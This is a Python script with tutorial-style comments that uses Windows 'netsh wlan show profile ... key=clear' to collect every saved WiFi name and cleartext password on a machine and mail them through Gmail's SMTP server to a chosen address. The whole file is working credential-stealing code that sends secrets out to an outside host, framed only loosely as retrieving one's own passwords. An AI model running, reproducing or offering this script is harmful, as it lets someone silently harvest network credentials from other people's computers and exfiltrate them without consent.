# TBD
# Python 3.9.1
# Basically this program will extract all passwords of all the WiFi that are connected with your device and
# mail it on the email address that you want.


# Here we use subprocess which helps us to run Command Prompt commands
import subprocess
# RE as in Regular expression helps us to properly format our output
import re
# smtplib module defines an SMTP client session object that can be used to send mail to any Internet machine.
import smtplib
# EmailMessage provides the functionality for setting and querying header fields, for accessing message bodies,
# and for creating or modifying structured messages.
from email.message import EmailMessage

# CMD script that will find all WiFi names as in SSIDs with their profiles and save it.
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

# We want to find all the Wifi names which are always listed as "ALL User Profile     :".
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# Create an empty list in which we will save all SSIDs with Passwords as Dictionaries.
wifi_list = list()

# If we aren't able to find any WiFi, that means we haven't connected with any Wifi as our system doesn't have any data.
# so we run this part to check for the details of the wifi and if we can get their passwords here.
if len(profile_names) != 0:
    for name in profile_names:
        # Every WiFi will need it's own dictionary which will be added to wifi_list.
        wifi_profile = dict()
        # Now we run a more specific command to see the information of the specific wifi connection.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # If security key is absent then we will directly ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            # Assign the SSID of WiFi profile to the Dictionary.
            wifi_profile["ssid"] = name
            # Here we use command "key=clear" as it will return us password of that specific SSID.
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            # Again use RE for capturing group afer " : " i.e. password.
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

# Create the message for the email
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# Create EmailMessage Object
email = EmailMessage()
email["from"] = "name_of_sender"
email["to"] = "email_address_of_receiver"
# Subject of the email
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

# Create smtp server
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    # Login using username and password to email.
    # Remember to set email so it allow less secure apps if you are using Gmail.
    smtp.login("login_email_address", "password")
    smtp.send_message(email)
